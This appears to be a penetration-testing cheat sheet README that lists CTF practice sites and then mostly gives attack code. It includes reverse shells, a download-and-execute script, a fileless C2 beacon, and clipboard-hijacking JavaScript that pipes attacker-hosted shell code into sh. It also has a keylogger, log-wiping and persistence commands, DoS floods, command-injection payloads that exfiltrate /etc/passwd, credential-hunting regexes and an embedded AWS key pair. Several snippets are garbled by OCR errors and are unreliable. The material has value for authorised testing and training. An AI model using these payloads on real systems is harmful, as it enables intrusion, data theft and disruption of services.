# :boom: Free Resources to Practice:

Share with your friends:

```
·       Academy Hackaflag BR - https://hackaflag.com.br/
·       Attack-Defense - https://attackdefense.com
·       Alert to win - https://alf.nu/alert1
·       CTF Komodo Security - https://ctf.komodosec.com
·       CMD Challenge - https://cmdchallenge.com
·       Explotation Education - https://exploit.education
·       Google CTF - https://lnkd.in/e46drbz8
·       HackTheBox - https://www.hackthebox.com
·       Hackthis - https://www.hackthis.co.uk
·       Hacksplaining - https://lnkd.in/eAB5CSTA
·       Hacker101 - https://ctf.hacker101.com
·       Hacker Security - https://lnkd.in/ex7R-C-e
·       Hacking-Lab - https://hacking-lab.com/
·       HSTRIKE - https://hstrike.com
·       ImmersiveLabs - https://immersivelabs.com
·       NewbieContest - https://lnkd.in/ewBk6fU5
·       OverTheWire - http://overthewire.org
·       Practical Pentest Labs - https://lnkd.in/esq9Yuv5
·       Pentestlab - https://pentesterlab.com
·       Penetration Testing Practice Labs - https://lnkd.in/e6wVANYd
·       PentestIT LAB - https://lab.pentestit.ru
·       PicoCTF - https://picoctf.com
·       PWNABLE - https://lnkd.in/eMEwBJzn
·       Root-Me - https://www.root-me.org
·       Root in Jail - http://rootinjail.com
·       SANS Challenger - https://lnkd.in/e5TAMawK
·       SmashTheStack - https://lnkd.in/eVn9rP9p
·       The Cryptopals Crypto Challenges - https://cryptopals.com
·       Try Hack Me - https://tryhackme.com
·       Vulnhub - https://www.vulnhub.com
·       W3Challs - https://w3challs.com
·       WeChall - http://www.wechall.net
·       Zenk-Security - https://lnkd.in/ewJ5rNx2
```

# Linux System Enumeration / Post Exploitation

```bash
id
w
who -a
last -a
ps -ef
df -h
uname -a
mount
cat /etc/issue
cat /etc/*-release
cat /etc/release
cat /proc/version
```

Search for useful binaries:

```bash
$ which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
# Password Hunting Regex:

```json
    "Slack Token": "(xox[pborsa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
    "RSA private key": "-----BEGIN RSA PRIVATE KEY-----",
    "SSH (DSA) private key": "-----BEGIN DSA PRIVATE KEY-----",
    "SSH (EC) private key": "-----BEGIN EC PRIVATE KEY-----",
    "PGP private key block": "-----BEGIN PGP PRIVATE KEY BLOCK-----",
    "AWS API Key": "((?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})",
    "Amazon MWS Auth Token": "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "AWS API Key": "AKIA[0-9A-Z]{16}",
    "AWS AppSync GraphQL Key": "da2-[a-z0-9]{26}",
    "Facebook Access Token": "EAACEdEose0cBA[0-9A-Za-z]+",
    "Facebook OAuth": "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]",
    "GitHub": "[gG][iI][tT][hH][uU][bB].*['|\"][0-9a-zA-Z]{35,40}['|\"]",
    "Generic API Key": "[aA][pP][iI]_?[kK][eE][yY].*['|\"][0-9a-zA-Z]{32,45}['|\"]",
    "Generic Secret": "[sS][eE][cC][rR][eE][tT].*['|\"][0-9a-zA-Z]{32,45}['|\"]",
    "Google API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Cloud Platform API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Cloud Platform OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google Drive API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Drive OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google (GCP) Service-account": "\"type\": \"service_account\"",
    "Google Gmail API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Gmail OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google OAuth Access Token": "ya29\\.[0-9A-Za-z\\-_]+",
    "Google YouTube API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google YouTube OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Heroku API Key": "[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
    "MailChimp API Key": "[0-9a-f]{32}-us[0-9]{1,2}",
    "Mailgun API Key": "key-[0-9a-zA-Z]{32}",
    "Password in URL": "[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"'\\s]",
    "PayPal Braintree Access Token": "access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",
    "Picatic API Key": "sk_live_[0-9a-z]{32}",
    "Slack Webhook": "https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
    "Stripe API Key": "sk_live_[0-9a-zA-Z]{24}",
    "Stripe Restricted API Key": "rk_live_[0-9a-zA-Z]{24}",
    "Square Access Token": "sq0atp-[0-9A-Za-z\\-_]{22}",
    "Square OAuth Secret": "sq0csp-[0-9A-Za-z\\-_]{43}",
    "Telegram Bot API Key": "[0-9]+:AA[0-9A-Za-z\\-_]{33}",
    "Twilio API Key": "SK[0-9a-fA-F]{32}",
    "Twitter Access Token": "[tT][wW][iI][tT][tT][eE][rR].*[1-9][0-9]+-[0-9a-zA-Z]{40}",
    "Twitter OAuth": "[tT][wW][iI][tT][tT][eE][rR].*['|\"][0-9a-zA-Z]{35,44}['|\"]"
 ```
 
# Linux Miscellaneous Commands / Covering Tracks

```bash
chattr (+/-)i file
unset HISTFILE
unset HISTFILESIZE
unset HISTSIZE
TERM=vt100
export TERM
echo "" /var/log/auth.log 
echo '''' -/.bash history
kill -9 $$
ln /dev/null -/.bash_history -sf
```
## Efficient Linux CLI Navigation:

![CLI](https://user-images.githubusercontent.com/72598486/204325842-a35ac0ca-0944-4c96-a089-6e0108945919.png)

# Fork Bomb

Linux: 

```bash
:(){:I: &I;:
```

Python: 

```python
#!/usr/bin/env python

    import os
    while True: os.fork()
```

# TCPDump

```bash
tcpdump -i ethO -XX -w out.pcap
tcpdump -i ethO port XX dst X.X.X.X
```

# Windows System Enumeration

```powershell
ver
time
net session
psloglist "Security" -i 528 -s | find /i "Logon Type: 10"
net statistics
nltest /dclist
net group /domain "Domain Admins"
date
tzutil /g
tracert 8.8.8.8
hostname
ipconfig
arp -a
route print
sc query state=all
tasklist /svc
tasklist /m
tasklist /S ip /v
taskkill /PID pid /F
systeminfo /S ip /U domain\user /P Pwd
dir /a /s /b c:\'.pdf'
dir /a /b c:\windows\kb'
findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
reg save HKLM\Security security.hive echo %USERNAME%
```

# Start RDP

```powershell
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
(Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

# PowerShell Enumeration

```powershell
Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
Get-Service I where object {$ .status -eq ''Running''}
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential( 11 title ", 11 message 11 1 11 user" 11 domain")
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subject11 -a " attachment file path " -body "Body" -SmtpServer Target Email Server IP
```

# PowerShell Launching Meterpreter Payload

1. msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.ps1
2. Move audit.ps1 into same folder as encodeMeterpreter.ps1
3. Launch Powershell (x86)
4. powershell.exe -executionpolicy bypass encodeMeterpreter.ps1
5. Copy the encoded Meterpreter string

# Windows User Lockout

```batch
@echo T est run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
```

# Windows DHCP Exhaustion

```powershell
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
```

# Rolling Reboot

```powershell
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message''
```

# TTL Fingerprinting

```
Windows : 128 
Linux : 64 
Network : 255 
Solaris : 255
```
# XSS Testing

Use this string on all input fields and identify what remains after filtering for XSS attacks:

```
'';!--"<XSS>=&{()}
```

# Cisco IOS 11.2 - 12.2 Vulnerability

```
http://ip/level/16-99/exec/show/config
```

# FTP Through Non-Interactive Shell

```bash
echo open ip 21 ftp.txt
echo user
echo pass
echo bin
echo GET file=tp.txt echo bfe ftp.txt
ftp -s:ftp.txt
```

# NetCat Listeners

```bash
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
```

Persistent Ncat listener:

```bash
ncat -lvk 443
```

# Python Reverse Shell

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket..;;F_INET, socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
p~subprocess.call( 1"/bin/sh","-i"] I;'
```

# Bash Reverse Shell

```bash
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

# Windows Persistence

```
1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

# HPING3 DoS

```bash
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

# Hydra Online Brute Force

```bash
hydra -1 ftp -P words -v targetiP ftp
```

# Download HTTP File and Execute

```python
#!/usr/bin/python import urllib2, os
urls = [11 1.1.1.1'',"2.2.2.2"] port = 11 80"
payload = "cb.sh"
for url in urls:
u = "http://%s:%s/%s" % (url, port, payload) try:
r = urllib2.urlopen(u)
wfile = open{"/tmp/cb.sh", "wb") wfile.write(r.read()) wfile.close ()
break
except: continue
if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
```

# Hashcat 

```
DICTIONARY ATTACK
hashcat -a 0 -m #type hash.txt
DICTIONARY + RULES ATTACK
hashcat -a 0 -m #type hash.txt
COMBINATION ATTACK
hashcat -a 1 -m #type hash.txt
MASK ATTACK
hashcat -a 3 -m #type hash.txt
HYBRID DICTIONARY + MASK
hashcat -a 6 -m #type hash.txt
HYBRID MASK + DICTIONARY
hashcat -a 7 -m #type hash.txt
dict.txt
dict.txt -r rule.txt
dict1.txt dict2.txt
?a?a?a?a?a?a
dict.txt ?a?a?a?a
?a?a?a?a dict.txt
```

# Malicious Javascript

```javascript
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
 </script>
 ```
# Execute Fileless Scripts in Golang

```golang
package main

import (
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    for {
        url := "http://my_command_control:8080/executeThisScript" // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beaconing
    }
}
```
# Golang Reverse Shell

```golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

# Enumerating IPs with IPInfo

```curl ipinfo.io/54.90.107.240```

```
{
  "ip": "54.90.107.240",
  "hostname": "ec2-54-90-107-240.compute-1.amazonaws.com",
  "city": "Virginia Beach",
  "region": "Virginia",
  "country": "US",
  "loc": "36.8512,-76.1692",
  "org": "AS14618 Amazon.com, Inc.",
  "postal": "23465",
  "readme": "https://ipinfo.io/missingauth"
}
```
You can also utilize https://cybergordon.com/ to check for IP reputation!

# Email Recon

```curl emailrep.io/john.smith@gmail.com```

```
{
  "email": "john.smith@gmail.com",
  "reputation": "high",
  "suspicious": false,
  "references": 91,
  "details": {
    "blacklisted": false,
    "malicious_activity": false,
    "malicious_activity_recent": false,
    "credentials_leaked": true,
    "credentials_leaked_recent": false,
    "data_breach": true,
    "last_seen": "07/27/2019",
    "domain_exists": true,
    "domain_reputation": "n/a",
    "new_domain": false,
    "days_since_domain_creation": 8773,
    "suspicious_tld": false,
    "spam": false,
    "free_provider": true,
    "disposable": false,
    "deliverable": true,
    "accept_all": false,
    "valid_mx": true,
    "spoofable": true,
    "spf_strict": true,
    "dmarc_enforced": false,
    "profiles": [
      "lastfm",
      "pinterest",
      "foursquare",
      "aboutme",
      "spotify",
      "twitter",
      "vimeo"
    ]
  }
}
```

# nrich IP Enumeration:

A command-line tool to quickly analyze all IPs in a file and see which ones have open ports/ vulnerabilities. Can also be fed data from stdin to be used in a data pipeline.

## Install:

```bash
$ wget https://gitlab.com/api/v4/projects/33695681/packages/generic/nrich/latest/nrich_latest_amd64.deb
$ sudo dpkg -i nrich_latest_amd64.deb
```

## Confirmation:

```
$ echo 149.202.182.140 | nrich -
149.202.182.140 (ftptech1.pcsoft.fr)
  Ports: 21, 80, 111, 443
  CPEs: cpe:/a:proftpd:proftpd:1.3.5b, cpe:/a:apache:http_server:2.4.25
  Vulnerabilities: CVE-2018-11763, CVE-2019-0220, CVE-2017-15710, CVE-2018-1312, CVE-2019-0197, CVE-2017-9798, CVE-2018-1283, CVE-2017-7668, CVE-2017-3169, CVE-2017-15715, CVE-2017-7659, CVE-2018-1333, CVE-2019-0211, CVE-2019-12815, CVE-2017-3167, CVE-2017-9788, CVE-2019-0196, CVE-2017-7679, CVE-2018-17199
```

## Usage:

```
$ nrich --help
nrich 0.1.0
Add network information to IPs

USAGE:
    nrich [OPTIONS] <filename>

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -o, --output <output>    Output format (shell or json) [default: shell]

ARGS:
    <filename>    File containing an IP per line. Non-IPs are ignored
```

# Extracting PDF Text with Python Image OCR:

```python
#!/usr/bin/env python3

from PIL import Image
import pyTesseract
import numpy as np

# Simple PDF Image OCR Extractor

file = '/home/rosesecurity/Desktop/Target_OrgChart.pdf'
pdf_img = np.array(Image.open(file))
text = pyTesseract.image_to_string(pdf_img)
```

# Threat Intelligence Streams with Python and Reddit:

Enumerate new Reddit comments for threat intelligence. This script can be modified with regular expressions to hone in on exploit development, modern threats, and any newsworthy cyber events. 

```python
#!/usr/bin/env python3

import praw

reddit = praw.Reddit(client_id ='xxxxxxxxxxxxxxx', 
                     client_secret ='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 
                     user_agent ='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 
                     username ='username', 
                     password ='pass') 


for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec+hackernews+malware+blueteamsec').stream.comments():
    print(comment.body)
```

# Python HTTPS Server:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
```

Source: ```https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration```

# Enumerating Anonymous FTP Logins Using Python:

```python
#!/usr/bin/python3

from ftplib import FTP
import sys

ips = open(sys.argv[1], 'r')
r = ips.readlines()
for item in r:
    item = item.strip()
    print("[+] Connecting to: %s \n" %item)
    try:
        ftp = FTP(item, timeout=3) 
        ftp.login()
       
        if ftp.retrlines('LIST') != 0:
            print("[+] Anonymous login enabled on Host: %s \n" %item)
            print("="*70+"\n")
    except:
        print("[+] Unable to Connect to Host: %s\n" %item)
        print("="*70+"\n")
```

1. Usage : ```python3 FTPLoginChecker.py ip_addresses.txt```
2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
3. Search Keyword : ```230 anonymous```

# Python Keylogger:

```python
import pyHook, pythoncom, logging
logging.basicConfig(filename='mykeylogger.txt', level=logging.DEBUG, format='%(message)s')

def OnKeyboardEvent(event):
    logging.log(logging.DEBUG,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
```

Mailtrap.io implementation:

```python
from pynput import keyboard
from pynput.keyboard import Listener
...
keyboard_listener = keyboard.Listener(on_press=self.save_data)
with keyboard_listener:
    self.report()
    keyboard_listener.join()
```

# Python Reverse Shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Python Basic File Upload

```python
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

## Generating HoneyDocs with Python:

Python's Faker module can be utilized to create honeydocs of PII with malicious macros, wordlists, emails for login brute-forcing, and much more.

```python
import pandas as pd
from faker import Faker

# Create a Faker object
fake = Faker()

# Options to data:
fake.name()
fake.text()
fake.address()
fake.email()
fake.date()
fake.country()
fake.phone_number()
fake.random_number(digits=5)

# Example DataFrame
faker_df = pd.DataFrame({'date':[fake.date() for i in range(10)],
                         'name':[fake.name() for i in range(10)],
                         'email':[fake.email() for i in range(10)],
                         'text':[fake.text() for i in range(10)]})
faker_df
```

# Cloud:

## Azure:

Enumerate for Priv Esc:

```bash
# Login
$ az login -u <user> -p <password>

# Set Account Subscription
$ az account set --subscription "Pay-As-You-Go"

# Enumeration for Priv Esc
$ az ad user list -o table
$ az role assignment list -o table
```

## AWS:

Shodan.io query to enumerate AWS Instance Metadata Service Access

```
/latest/meta-data/iam/security-credentials
```

Google Dorking for AWS Access Keys

```
inurl:pastebin "AWS_ACCESS_KEY"
```

Recursively searching for AWS Access Keys on *Nix containers

```bash
$ grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
```

S3 Log Google Dorking

```
s3 site:amazonaws.com filetype:log
```

Python code to check if AWS key has permissions to read s3 buckets:

```python
import boto3
import json

aws_access_key_id = 'AKIAQYLPMN5HIUI65MP3'
aws_secret_access_key = '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'
region = 'us-east-2'

session = boto3.Session(
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=region
)

s3 = session.resource('s3')

try:
    response = []
    for bucket in s3.buckets.all():
        response.append(bucket.name)
    print(json.dumps(response))
except Exception as e:
    print(f"Error: {e}")
```

## Kubernetes Secrets Harvesting:

```bash
$ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
```

## Kubernetes Ninja Commands:

```bash
# List all pods in the current namespace.
kubectl get pods

# Get detailed information about a pod.
kubectl describe pod <pod-name>

# Create a new pod.
kubectl create pod <pod-name> 

# List all nodes in the cluster.
kubectl get nodes 

# Get detailed information about a node.
kubectl describe node <node-name> 

# Create a new node
kubectl create node <node-name> 

# List all services in the cluster.
kubectl get services 

# Get detailed information about a service.
kubectl describe service <service-name> 

# Create a new service.
kubectl create service <service-name> 

# List all secrets in the cluster.
kubectl get secrets 

# Get detailed information about a secret.
kubectl describe secret <secret-name> 

# Create a new secret.
kubectl create secret <secret-name> 
```

# Web Applications:

## Command Injection:

Special Characters

```
&
;
Newline (0x0a or \n)
&&
|
||
command `
$(command )
```

Ngrok for Command Injection:

```bash
# Start listener
$ ./ngrok http 80

# Test for blind injection
Input field - > ;%20curl%20blablabla.ngrok.io

# Take it all
Input field -> ;curl%20-F%20shl=@/etc/passwd%20blablabla.ngrok.io
```

Useful Commands: Linux

```bash
whoami
ifconfig
ls
uname -a
```

Useful Commands: Windows

```powershell
whoami
ipconfig
dir
ver
```

Both Unix and Windows

```
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id
```

Time Delay Commands
```bash
& ping -c 10 127.0.0.1 &
```

Redirecting Output
```bash
& whoami > /var/www/images/output.txt &
```
OOB (Out Of Band) Exploitation
```bash
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
```
WAF Bypasses
```bash
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```

XSS Cheat Sheet:

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

SSRF Bypasses:

```
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

## WayBack Machine Enumerator:

Python script for enumerating Wayback Machine internet archives for potential subdomains, sites, and files; specifically potential password and robots.txt files.

```python
#!/usr/bin/env python3

import requests
import os

# Input Target
site = input("Input Target Website: ")

# Web Request
url = str("https://web.archive.org/cdx/search/cdx?url=" + site + "/*&output=text&fl=original&collapse=urlkey")
url_request = requests.get(url)

# Write to File
web_file = open("/tmp/website_enum.txt", "a")
web_file.write(url_request.text)
web_file.close()


with open("/tmp/website_enum.txt", "r") as file:
    info = file.read()
    print("\nPossible Password Files\n")
    passwords = os.system("grep password /tmp/website_enum.txt")
    print("\nRobots.txt File\n")
    robots = os.system("grep robots.txt /tmp/website_enum.txt")
    print("\nFull Data Can Be Found in /tmp/website_enum.txt\n")
```

Or use this one-liner to screenshot web pages with EyeWitness!

```python
root@RoseSecurity:~# python3 -c 'import requests; import os; url = str("https://web.archive.org/cdx/search/cdx?url=<website>/*&output=text&fl=original&collapse=urlkey"); url_request = requests.get(url); web_file = open("/tmp/website_enum.txt", "a"); web_file.write(url_request.text); web_file.close()'; eyewitness -f /tmp/website_enum.txt
```

## Golang Webserver Banner Scanner:

This program reads in a file of IP addresses, outputting the server fingerprint to the terminal.

```go
package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
)

func readfile(filePath string) []string {
	// Read file
	readFile, err := os.Open(filePath)
	if err != nil {
		fmt.Println(err)
	}
	// Split lines and append to array
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	var fileLines []string
	for fileScanner.Scan() {
		fileLines = append(fileLines, fileScanner.Text())
	}
	readFile.Close()
	return fileLines
}
func scanIPs(ips []string) {
	// Connect to device ports
	for i := range ips {
		target := "http://" + ips[i]
		response, err := http.Get(target)
		if err != nil {
			continue
		}
		fmt.Println(ips[i], response.Header.Get("Server"))
	}
}

func main() {
	// Command line argument to parse
	filePath := os.Args[1]
	ips := readfile(filePath)
	// Goroutines
	go scanIPs(ips)
	var input string
	fmt.Scanln(&input)
}
```

## Minimal Golang WebDAV Server:

```go
package main

import (
    "flag"
    "golang.org/x/net/webdav"
    "net/http"
)

func main() {
    var address string
    flag.StringVar(&address, "a", "localhost:8080", "Address to listen to.")
    flag.Parse()

    handler := &webdav.Handler{
        FileSystem: webdav.Dir("."),
        LockSystem: webdav.NewMemLS(),
    }

    http.ListenAndServe(address, handler)
}
```

## Apple Filing Protocol (AFP)

The Apple Filing Protocol (AFP), once known as AppleTalk Filing Protocol, is a specialized network protocol included within the Apple File Service (AFS). It is designed to provide file services for macOS and the classic Mac OS.

```sh
msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script "afp-* and not dos and not brute" -p <PORT> <IP>
```

## Pre-Commit Hooks to Prevent Credential Leaks:

```yaml
-   repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v3.2.0
    hooks:
    -   id: detect-aws-credentials
    -   id: detect-private-key
```

## Scanning Git History for Secrets:

```
# Install git-secrets and build
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets
make install

# Register needed plugins
git secrets -register-azure
git secrets -register-aws
git secrets — register-gcp

# Scan Git
git secrets --scan 
git secrets --scan-history 
git secrets --scan /path/to/file
```

## Mac SMB Lateral Movement:

```
open "smb://rosesecurity@10.9.11.105/"
```

## Truffleroasting GitHub Organizations:

```bash
#!/usr/bin/env bash

# Enumerate GitHub organizations for secrets and credentials
PAT=<GitHub PAT>
ID=1
while [ $ID -lt 1000000 ]
do 
    curl -L \
    -H "Accept: application/vnd.github+json" \
    -H "Authorization: Bearer $PAT" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    -H "Per-Page: 100" \
    "https://api.github.com/organizations?per_page=100&since=$ID" | jq -r .[].login >> orgs.txt
    ID=$((ID + 10000))
done

# Read each line from orgs.txt and run trufflehog for each organization
while read -r line; do
    trufflehog github --concurrency=5 -j --org="$line" >> truffle_org.txt
done < orgs.txt
```

## Turning Nmap into a Vulnerability Scanner Using GitHub Actions:

```yaml
name: Nmap GitHub Action
on:
  push:
    branches:
      - main
jobs:
  run_script_with_package:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2
        
      - name: Install Nmap
        run: sudo apt-get update && sudo apt-get install -y nmap

      - name: Run Nmap Vulnerability Scanner
        run: |
          git clone https://github.com/scipag/vulscan scipag_vulscan
          sudo ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
          nmap -sV --script=vulscan/vulscan.nse rosesecurityresearch.com
```
